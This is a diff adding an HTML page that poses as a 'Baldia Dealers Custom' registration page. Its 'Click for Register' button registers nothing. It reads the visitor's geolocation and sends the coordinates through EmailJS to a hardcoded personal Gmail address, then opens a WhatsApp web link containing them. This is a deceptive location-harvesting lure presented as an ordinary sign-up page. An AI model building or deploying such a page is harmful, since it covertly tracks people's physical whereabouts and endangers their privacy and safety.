@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<head>
+  <link rel="icon" type="image/png" href="bhai (2).png" style="border-radius: 10px;">
+    <title>Distric North</title>
+        <style>
+         * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+      background: #000;
+      color: white;
+      gap: 20px;
+    }
+    img{
+      height: 100vh;
+      width: 100%;
+      opacity: 10%;
+      align-items: center;
+      justify-content: center;
+    }
+
+    h2 {
+      font-size: 50px;
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translateX(-50%);
+      text-align: center;
+      cursor: pointer;
+    }
+
+    button {
+      padding: 22px 25px;
+      border: none;
+      border-radius: 10px;
+      background: white;
+      color: black;
+      font-size: 18px;
+      font-family: 'Times New Roman', Times, serif;
+      cursor: pointer;
+      transition: 0.3s;
+      position: absolute;
+      top: 50vh;
+      left: 45%;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+    }
+    #output {
+      margin-top: 20px;
+      text-align: left;
+      word-wrap: break-word;
+    }
+
+    @media (max-width: 768px) {
+
+  img {
+    width: 180px;
+    opacity: 0.06;
+    right: -20px;
+    bottom: 0;
+  }
+
+  h2 {
+    font-size: 28px;
+    width: 90%;
+  }
+
+  button {
+    font-size: 15px;
+    padding: 14px 18px;
+    top: 58%;
+  }
+}
+Get
+  </style>
+</head>
+<body>
+  <a href="#"><img src="bhai (2).png" alt="bhai"></a>
+  <div class="box" >
+    <h2>Baldia Dealers Custom</h2>
+
+    <button onclick="getLocation()">
+      Click for Register
+    </button>
+
+    
+
+
+    <div id="output"></div>
+  </div>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+
+emailjs.init("7IpNoo6zUZp69IFfu");
+
+
+
+
+    function getLocation() {
+      const output = document.getElementById('output');
+
+       
+
+      output.innerHTML = 'Location fetch ho rahi hai...';
+
+      // Google Maps auto-open bhi hoga
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          output.innerHTML = `
+            <p><strong>Latitude:</strong> ${lat}</p>
+            <p><strong>Longitude:</strong> ${lon}</p>
+            <p><strong>Accuracy:</strong> ${accuracy} meters</p>
+
+            <p>
+              <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">
+                Open in Google Maps
+              </a>
+            </p>
+          `;
+            sendMail(output.innerHTML);
+
+          // Automatically open Google Maps
+          window.open(`https://web.whatsapp.com//?q=${lat},${lon}`, '_blank');
+        },
+        function(error) {
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              output.innerHTML = 'User ne location permission deny kar di';
+              break;
+            case error.POSITION_UNAVAILABLE:
+              output.innerHTML = 'Location unavailable hai';
+              break;
+            case error.TIMEOUT:
+              output.innerHTML = 'Location request timeout ho gaya';
+              break;
+            default:
+              output.innerHTML = 'Unknown error';
+          }
+          
+        }
+      );
+
+
+      
+function sendMail(msg) {
+
+  emailjs.send("service_b8lm2n4", "template_e406psq", {
+
+    name: "Website User",
+
+    message: msg,
+
+    to_email: "a.sammadimrani@gmail.com"
+
+  })
+
+ 
+
+  .catch(function(error) {
+
+      alert("Failed!");
+
+      console.log(error);
+
+  });
+
+}
+
+
+
+    }
+  </script>
+</body>
+</html>
